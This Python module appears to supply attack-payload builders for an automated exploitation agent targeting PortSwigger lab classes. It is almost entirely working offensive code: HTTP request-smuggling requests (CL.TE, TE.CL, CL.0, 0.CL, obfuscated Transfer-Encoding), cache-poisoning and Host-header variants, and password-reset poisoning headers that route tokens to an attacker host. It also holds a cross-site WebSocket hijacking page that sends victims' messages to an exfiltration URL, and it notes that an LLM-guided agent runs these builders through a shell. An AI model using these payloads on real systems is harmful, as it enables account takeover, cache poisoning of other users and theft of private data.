"""
=============================================================================
Reynard — PROTOCOL / INFRA deterministic scaffolding
=============================================================================
Reusable, dependency-light (pure stdlib) building blocks for the hardest
protocol-level PortSwigger classes:

  * HTTP request smuggling / desync (CL.TE, TE.CL, obfuscated-TE, CL.0, 0.CL,
    H2 downgrade notes, response-queue / tunnelling helpers).
  * Web cache poisoning (cache-buster, unkeyed header/cookie/param builders,
    parameter cloaking, fat-GET, URL-normalization, reflect+cache-hit detect).
  * HTTP Host header attacks (Host / X-Forwarded-Host variants, absolute-URI
    and duplicate-Host raw builders, password-reset poisoning headers).
  * WebSockets (raw handshake builder, cross-site WS hijacking exploit page,
    a runnable ws client script for message/handshake manipulation).

Everything here is a **pure function** returning bytes/str/dicts so it is
trivially unit-testable (exact request framing) and never performs I/O or
fails at import time. The exploitation agent wires these into deterministic
fast-paths (and the guided-LLM path, via race_send / burp_send_http1_request
/ run_shell, uses the same builders for the EXPERT tail).

Byte-framing conventions (RFC 7230):
  * CRLF terminates every header line and the header block.
  * A chunk is ``<hex-size>CRLF<data>CRLF``; the terminator is ``0CRLFCRLF``.
  * CL.TE: front-end honours Content-Length, back-end honours Transfer-Encoding.
  * TE.CL: front-end honours Transfer-Encoding, back-end honours Content-Length.
=============================================================================
"""
from __future__ import annotations

import secrets
from urllib.parse import urlparse

CRLF = "\r\n"


# =============================================================================
# Low-level framing primitives
# =============================================================================

def chunk(data: str) -> str:
    """Encode ``data`` as a single HTTP/1.1 chunk (``<hex-len>CRLF data CRLF``)."""
    return f"{len(data):x}{CRLF}{data}{CRLF}"


def chunked_terminator() -> str:
    """The zero-length chunk that terminates a chunked body: ``0CRLFCRLF``."""
    return f"0{CRLF}{CRLF}"


def chunked_body(data: str = "") -> str:
    """Full chunked body for ``data`` followed by the terminating chunk.

    ``chunked_body("")`` is just the terminator, so both a normal chunked
    payload and an empty one round-trip through the same helper.
    """
    if not data:
        return chunked_terminator()
    return chunk(data) + chunked_terminator()


def raw_request(
    method: str,
    path: str,
    host: str,
    *,
    headers: dict[str, str] | None = None,
    body: str = "",
    version: str = "HTTP/1.1",
    add_content_length: bool = False,
    trailing_blank_line: bool = True,
) -> str:
    """Assemble a raw HTTP request as a string (caller encodes for the wire).

    ``trailing_blank_line=False`` omits the final CRLF pair — used when the
    request is a *smuggled prefix* that must merge with the victim's next
    request on the connection.
    """
    lines = [f"{method.upper()} {path} {version}", f"Host: {host}"]
    hdrs = dict(headers or {})
    if add_content_length and "content-length" not in {k.lower() for k in hdrs}:
        hdrs["Content-Length"] = str(len(body))
    lines += [f"{k}: {v}" for k, v in hdrs.items()]
    head = CRLF.join(lines)
    if trailing_blank_line:
        return head + CRLF + CRLF + body
    # No terminating blank line: header block ends with a single CRLF so the
    # smuggled request line stays contiguous with whatever follows it.
    return head + CRLF + body


# =============================================================================
# HTTP request smuggling — CL.TE / TE.CL / obfuscated-TE / CL.0 / 0.CL
# =============================================================================

def build_clte_request(
    host: str,
    smuggled: str,
    *,
    method: str = "POST",
    path: str = "/",
    te_header: str = "Transfer-Encoding: chunked",
    content_type: str = "application/x-www-form-urlencoded",
    extra_headers: dict[str, str] | None = None,
) -> str:
    """CL.TE smuggle: front-end uses Content-Length, back-end uses TE.

    Body is ``0CRLFCRLF`` + ``smuggled``; ``Content-Length`` covers the whole
    body so the front-end forwards everything, while the TE-honouring back-end
    stops at the zero chunk and treats ``smuggled`` as the next request.
    """
    body = chunked_terminator() + smuggled
    lines = [
        f"{method.upper()} {path} HTTP/1.1",
        f"Host: {host}",
        f"Content-Type: {content_type}",
        f"Content-Length: {len(body)}",
        te_header,
        "Connection: keep-alive",
    ]
    for key, value in (extra_headers or {}).items():
        lines.append(f"{key}: {value}")
    return CRLF.join(lines) + CRLF + CRLF + body


def build_tecl_request(
    host: str,
    smuggled: str,
    *,
    method: str = "POST",
    path: str = "/",
    te_header: str = "Transfer-Encoding: chunked",
    content_length: int | None = None,
    content_type: str = "application/x-www-form-urlencoded",
    extra_headers: dict[str, str] | None = None,
) -> str:
    """TE.CL smuggle: front-end uses TE, back-end uses Content-Length.

    Body is ``<hex(len(smuggled))>CRLF smuggled CRLF 0CRLFCRLF``. The
    TE-honouring front-end reads the whole chunked body; the CL-honouring
    back-end reads only ``content_length`` bytes (default = the chunk-size
    line + CRLF, e.g. ``4`` for a ``5c`` size line), leaving ``smuggled`` as
    the start of the next request.
    """
    size_line = f"{len(smuggled):x}"
    body = f"{size_line}{CRLF}{smuggled}{CRLF}" + chunked_terminator()
    if content_length is None:
        content_length = len(size_line) + len(CRLF)
    lines = [
        f"{method.upper()} {path} HTTP/1.1",
        f"Host: {host}",
        f"Content-Type: {content_type}",
        f"Content-Length: {content_length}",
        te_header,
        "Connection: keep-alive",
    ]
    for key, value in (extra_headers or {}).items():
        lines.append(f"{key}: {value}")
    return CRLF.join(lines) + CRLF + CRLF + body


def build_cl0_request(
    host: str,
    smuggled: str,
    *,
    method: str = "POST",
    path: str = "/",
    extra_headers: dict[str, str] | None = None,
) -> str:
    """CL.0 smuggle: front-end honours Content-Length, back-end treats the
    body as empty (Content-Length effectively 0 for this endpoint), so the
    body — a complete request — is processed as the next request.

    Target ``path`` should be an endpoint the back-end serves without reading
    a body (e.g. a static resource / GET-style handler).
    """
    lines = [
        f"{method.upper()} {path} HTTP/1.1",
        f"Host: {host}",
        f"Content-Length: {len(smuggled)}",
        "Connection: keep-alive",
    ]
    for key, value in (extra_headers or {}).items():
        lines.append(f"{key}: {value}")
    return CRLF.join(lines) + CRLF + CRLF + smuggled


def build_0cl_request(
    host: str,
    smuggled: str,
    *,
    method: str = "POST",
    path: str = "/",
    content_length: int | None = None,
    extra_headers: dict[str, str] | None = None,
) -> str:
    """0.CL smuggle: front-end treats the body as empty, back-end honours
    Content-Length. Mirrors CL.0 with the roles reversed; the back-end reads
    ``content_length`` body bytes (default = full ``smuggled`` length).
    """
    if content_length is None:
        content_length = len(smuggled)
    lines = [
        f"{method.upper()} {path} HTTP/1.1",
        f"Host: {host}",
        f"Content-Length: {content_length}",
        "Connection: keep-alive",
    ]
    for key, value in (extra_headers or {}).items():
        lines.append(f"{key}: {value}")
    return CRLF.join(lines) + CRLF + CRLF + smuggled


# Curated Transfer-Encoding obfuscations used to desync a front-end/back-end
# pair that disagree on how to parse the header. (label, header-line).
def obfuscated_te_variants() -> list[tuple[str, str]]:
    """Known obfuscated ``Transfer-Encoding`` header lines for TE detection."""
    return [
        ("plain", "Transfer-Encoding: chunked"),
        ("space_before_colon", "Transfer-Encoding : chunked"),
        ("tab_after_colon", "Transfer-Encoding:\tchunked"),
        ("leading_space", " Transfer-Encoding: chunked"),
        ("vertical_tab", "Transfer-Encoding:\x0bchunked"),
        ("value_prefix", "Transfer-Encoding: xchunked"),
        ("value_suffix_space", "Transfer-Encoding: chunked "),
        ("quoted_value", 'Transfer-Encoding: "chunked"'),
        ("cow", "Transfer-Encoding: chunked\r\nTransfer-Encoding: cow"),
        ("dup_x", "Transfer-Encoding: cow\r\nTransfer-Encoding: chunked"),
        ("name_prefix_space", "X: X\r\nTransfer-Encoding: chunked"),
        ("case", "transfer-encoding: chunked"),
    ]


def build_smuggled_prefix(
    host: str,
    smuggled_path: str,
    *,
    method: str = "GET",
    swallow_header: str = "X-Ignore",
    body: str = "",
) -> str:
    """Build the inner (smuggled) request line + headers with no trailing blank
    line, so it merges with the victim's following request.

    ``swallow_header`` is an incomplete trailing header (``X-Ignore: X``) which
    absorbs the start of the victim's next request line — the classic trick to
    keep the smuggled request well-formed.
    """
    smuggled_path = smuggled_path if smuggled_path.startswith("/") else f"/{smuggled_path}"
    lines = [f"{method.upper()} {smuggled_path} HTTP/1.1", f"Host: {host}"]
    if body:
        lines.append("Content-Type: application/x-www-form-urlencoded")
        lines.append(f"Content-Length: {len(body)}")
    tail = f"{swallow_header}: X" if swallow_header else ""
    prefix = CRLF.join(lines) + CRLF + tail
    return prefix + (CRLF + CRLF + body if body else "")


# ---- HTTP/2 downgrade notes (require an h2-capable sender) ------------------

def h2_downgrade_note() -> dict[str, str]:
    """Guidance for H2.CL / H2.TE / H2 CRLF-injection / request-splitting.

    HTTP/2 desync needs a client that speaks h2 verbatim (Burp's HTTP/2 tab,
    ``burp_send_http1_request`` with an HTTP/2 target, or a custom h2 script),
    because the downgrade happens at the front-end. These strings describe the
    smuggled *content* to inject via such a sender.
    """
    return {
        "h2_cl": (
            "Send an HTTP/2 request carrying an explicit content-length that is "
            "shorter than the real body; the h2->h1 downgrade appends the extra "
            "bytes as a smuggled request."
        ),
        "h2_te": (
            "Add 'transfer-encoding: chunked' as an HTTP/2 header; a naive "
            "downgrade emits it in the h1 request, desyncing a TE-honouring "
            "back-end."
        ),
        "h2_crlf": (
            "Inject CRLF in an HTTP/2 header value/name (e.g. foo: bar\\r\\n"
            "smuggled: 1) to split the downgraded h1 request."
        ),
        "h2_request_splitting": (
            "Put a full request line + Host in an injected h2 header value so "
            "the downgraded stream becomes two h1 requests."
        ),
        "tunnelling": (
            "If the front-end tunnels rather than parses, use the response to a "
            "smuggled request to confirm blind desync (timing / status delta)."
        ),
    }


# =============================================================================
# Web cache poisoning
# =============================================================================

def rand_token(nbytes: int = 6) -> str:
    """A short URL-safe random token (cache-buster / marker uniqueness)."""
    return secrets.token_hex(nbytes)


def cache_buster(value: str = "", param: str = "cb") -> str:
    """Return a ``param=value`` cache-buster query fragment.

    A cache-buster makes each poisoning attempt hit a *distinct* cache key so
    the reflected/poisoned response is observed cleanly, then re-requested
    (without the attack header) to confirm it was served from the cache.
    """
    return f"{param}={value or rand_token()}"


def unkeyed_header_variants(payload_host: str) -> list[tuple[str, dict[str, str]]]:
    """Header sets that are frequently *unkeyed* by caches yet reflected."""
    return [
        ("x-forwarded-host", {"X-Forwarded-Host": payload_host}),
        ("x-forwarded-scheme", {"X-Forwarded-Scheme": "nothttps"}),
        ("x-forwarded-host+scheme",
         {"X-Forwarded-Host": payload_host, "X-Forwarded-Scheme": "nothttps"}),
        ("x-host", {"X-Host": payload_host}),
        ("x-forwarded-server", {"X-Forwarded-Server": payload_host}),
        ("x-original-url", {"X-Original-URL": "/"}),
        ("x-forwarded-for", {"X-Forwarded-For": payload_host}),
        ("forwarded", {"Forwarded": f"host={payload_host}"}),
    ]


def unkeyed_cookie_variants(payload: str,
                            names: tuple[str, ...] = ("fehost", "lang", "cookie")
                            ) -> list[tuple[str, dict[str, str]]]:
    """Cookie header variants for unkeyed-cookie cache poisoning."""
    out: list[tuple[str, dict[str, str]]] = []
    for name in names:
        out.append((f"cookie:{name}", {"Cookie": f"{name}={payload}"}))
    return out


def param_cloaking_variants(param: str, payload: str,
                            decoy: str = "utm_content") -> list[tuple[str, str]]:
    """Parameter-cloaking query strings (cache keys the decoy, app reads the
    real param). Returns (label, query-string)."""
    return [
        ("semicolon_cloak", f"{decoy}=1;{param}={payload}"),
        ("dup_param", f"{param}=safe&{param}={payload}"),
        ("fat_semicolon", f"{param}={payload};{decoy}=1"),
        ("keyed_decoy", f"{decoy}=1&{param}={payload}"),
    ]


def fat_get(param: str, payload: str) -> tuple[str, dict[str, str]]:
    """A GET request body ('fat GET') — some caches key only the query string
    while the app also parses the body. Returns (body, headers)."""
    body = f"{param}={payload}"
    return body, {"Content-Type": "application/x-www-form-urlencoded"}


def url_normalization_variants(path: str) -> list[tuple[str, str]]:
    """Path variants exploiting cache/origin URL-normalization differences."""
    path = path if path.startswith("/") else f"/{path}"
    return [
        ("encoded_dot", path + "%2f%2e%2e"),
        ("trailing_encoded_slash", path + "%2f"),
        ("newline", path + "%0a"),
        ("semicolon", path + ";foo=bar"),
        ("double_slash", "/" + path.lstrip("/")),
    ]


# ---- cache/reflection detection --------------------------------------------

_CACHE_HIT_MARKERS = (
    ("x-cache", ("hit",)),
    ("cf-cache-status", ("hit",)),
    ("x-cache-hits", ("1", "2", "3", "4", "5", "6", "7", "8", "9")),
    ("age", tuple(str(n) for n in range(1, 10))),
)


def _header_map(response: str) -> dict[str, str]:
    """Parse the *last* header block of a raw response into a lower-keyed map."""
    if not response:
        return {}
    # curl -D- with -L may stack multiple header blocks; take the final one
    # that precedes a body (or the whole text if no body separator present).
    head = response
    if CRLF + CRLF in response:
        head = response.rsplit(CRLF + CRLF, 1)[0]
        # keep only the final header block
        head = head.split(CRLF + CRLF)[-1]
    elif "\n\n" in response:
        head = response.rsplit("\n\n", 1)[0].split("\n\n")[-1]
    out: dict[str, str] = {}
    for line in head.replace("\r\n", "\n").split("\n"):
        if ":" in line and not line.upper().startswith("HTTP/"):
            key, _, value = line.partition(":")
            out[key.strip().lower()] = value.strip()
    return out


def cache_status(response: str) -> str | None:
    """Return the cache-status header value if present (X-Cache/CF-Cache/Age)."""
    hdrs = _header_map(response)
    for name in ("x-cache", "cf-cache-status", "x-cache-hits", "age",
                 "x-varnish", "x-drupal-cache"):
        if name in hdrs:
            return f"{name}: {hdrs[name]}"
    return None


def is_cache_hit(response: str) -> bool:
    """Heuristic: does the raw response look like it was served from cache?"""
    hdrs = _header_map(response)
    for name, needles in _CACHE_HIT_MARKERS:
        value = hdrs.get(name, "").lower()
        if value and any(n in value for n in needles):
            return True
    return False


def reflected(marker: str, response: str) -> bool:
    """True when ``marker`` appears anywhere in the response (headers or body)."""
    return bool(marker) and marker in (response or "")


# =============================================================================
# HTTP Host header attacks
# =============================================================================

def host_header_variants(injected_host: str) -> list[tuple[str, dict[str, str]]]:
    """Header-only Host-override variants (work through a normal HTTP client)."""
    return [
        ("host", {"Host": injected_host}),
        ("x-forwarded-host", {"X-Forwarded-Host": injected_host}),
        ("x-host", {"X-Host": injected_host}),
        ("x-forwarded-server", {"X-Forwarded-Server": injected_host}),
        ("x-http-host-override", {"X-HTTP-Host-Override": injected_host}),
        ("forwarded", {"Forwarded": f"host={injected_host}"}),
        ("x-forwarded-host+host",
         {"Host": injected_host, "X-Forwarded-Host": injected_host}),
    ]


def duplicate_host_request(original_host: str, injected_host: str,
                           *, method: str = "GET", path: str = "/") -> str:
    """Raw request with two Host headers (front-end/back-end may pick different
    ones). Needs a raw sender (race_send / burp) — a normal client dedupes."""
    lines = [
        f"{method.upper()} {path} HTTP/1.1",
        f"Host: {original_host}",
        f"Host: {injected_host}",
        "Connection: close",
    ]
    return CRLF.join(lines) + CRLF + CRLF


def absolute_uri_request(original_host: str, injected_host: str,
                         *, method: str = "GET", path: str = "/",
                         scheme: str = "https") -> str:
    """Raw request whose request-line uses an absolute URI while Host differs —
    a routing/parsing-based SSRF & host-validation-bypass primitive."""
    lines = [
        f"{method.upper()} {scheme}://{injected_host}{path} HTTP/1.1",
        f"Host: {original_host}",
        "Connection: close",
    ]
    return CRLF.join(lines) + CRLF + CRLF


def indented_host_request(original_host: str, injected_host: str,
                          *, method: str = "GET", path: str = "/") -> str:
    """Connection-state / line-folding Host-validation bypass: the first
    (indented) Host line may be ignored by the validator but honoured later."""
    lines = [
        f"{method.upper()} {path} HTTP/1.1",
        f"Host: {injected_host}",
        f" Host: {original_host}",
        "Connection: keep-alive",
    ]
    return CRLF.join(lines) + CRLF + CRLF


def password_reset_poison_headers(collab_host: str) -> list[tuple[str, dict[str, str]]]:
    """Header variants that poison a password-reset email link's host so the
    reset token is delivered to the attacker (Collaborator/OOB) host."""
    return [
        ("host", {"Host": collab_host}),
        ("x-forwarded-host", {"X-Forwarded-Host": collab_host}),
        ("host+x-forwarded-host",
         {"Host": collab_host, "X-Forwarded-Host": collab_host}),
        ("dangling_markup",
         {"X-Forwarded-Host": f"{collab_host}/?"}),
    ]


# =============================================================================
# WebSockets
# =============================================================================

def ws_handshake_request(host: str, path: str = "/", *,
                         origin: str | None = None,
                         key: str = "x3JJHMbDL1EzLkh9GBhXDw==",
                         extra_headers: dict[str, str] | None = None) -> str:
    """Build a raw WebSocket upgrade (handshake) request for manipulation of
    handshake headers / Origin (raw sender or burp)."""
    path = path if path.startswith("/") else f"/{path}"
    lines = [
        f"GET {path} HTTP/1.1",
        f"Host: {host}",
        "Upgrade: websocket",
        "Connection: Upgrade",
        f"Sec-WebSocket-Key: {key}",
        "Sec-WebSocket-Version: 13",
    ]
    if origin is not None:
        lines.append(f"Origin: {origin}")
    for key_name, value in (extra_headers or {}).items():
        lines.append(f"{key_name}: {value}")
    return CRLF.join(lines) + CRLF + CRLF


def cswsh_page(ws_url: str, exfil_url: str) -> tuple[str, str]:
    """Cross-site WebSocket hijacking exploit page (head, body).

    Opens ``ws_url`` from the attacker origin (the victim's cookies ride along
    if the handshake is not origin-checked), collects messages, and exfils them
    to ``exfil_url`` (an OOB/Collaborator endpoint) so the solve is verifiable.
    """
    head = "Content-Type: text/html; charset=utf-8"
    ws_lit = repr(ws_url)
    exfil_lit = repr(exfil_url)
    lines = [
        "<!DOCTYPE html><html><body><script>",
        "var ws = new WebSocket(" + ws_lit + ");",
        "ws.onopen = function() { ws.send('READY'); };",
        "ws.onmessage = function(e) {",
        "  fetch(" + exfil_lit + " + '?m=' + encodeURIComponent(e.data), {mode: 'no-cors'});",
        "  new Image().src = " + exfil_lit + " + '?img=' + encodeURIComponent(e.data);",
        "};",
        "</script></body></html>",
    ]
    return head, "\n".join(lines)


def ws_client_script(ws_url: str, messages: list[str], *,
                     origin: str | None = None,
                     extra_headers: dict[str, str] | None = None,
                     timeout: float = 8.0) -> str:
    """Return a runnable Python script (via ``run_shell``) that connects to
    ``ws_url``, optionally overrides Origin/handshake headers, sends each
    message, and prints the responses — for message/handshake manipulation.

    Uses ``websocket-client`` (the ``websocket`` module, common in Kali) with a
    clear error if it is unavailable.
    """
    header_list = []
    for key_name, value in (extra_headers or {}).items():
        header_list.append(f"{key_name}: {value}")
    return (
        "import json, sys\n"
        "try:\n"
        "    import websocket\n"
        "except Exception as e:\n"
        "    print(json.dumps({'error': 'pip install websocket-client: %s' % e})); sys.exit(0)\n"
        f"HEADER = {header_list!r}\n"
        f"ORIGIN = {origin!r}\n"
        f"MESSAGES = {list(messages)!r}\n"
        f"URL = {ws_url!r}\n"
        "kwargs = {}\n"
        "if ORIGIN: kwargs['origin'] = ORIGIN\n"
        "if HEADER: kwargs['header'] = HEADER\n"
        "out = []\n"
        "try:\n"
        f"    ws = websocket.create_connection(URL, timeout={timeout}, **kwargs)\n"
        "    for m in MESSAGES:\n"
        "        ws.send(m)\n"
        "        try:\n"
        "            out.append(ws.recv())\n"
        "        except Exception as re:\n"
        "            out.append('recv-error: %s' % re)\n"
        "    ws.close()\n"
        "except Exception as e:\n"
        "    print(json.dumps({'error': str(e)})); sys.exit(0)\n"
        "print(json.dumps({'responses': out}))\n"
    )


# =============================================================================
# Target helpers
# =============================================================================

def split_target(url: str) -> tuple[str, int, bool, str]:
    """(host, port, https, path) for a URL — mirrors race.py's parser so the
    smuggling builders and the raw sender agree on the target."""
    parsed = urlparse(url if "://" in url else f"https://{url}")
    host = parsed.hostname or ""
    https = parsed.scheme != "http"
    port = parsed.port or (443 if https else 80)
    path = parsed.path or "/"
    if parsed.query:
        path += f"?{parsed.query}"
    return host, port, https, path
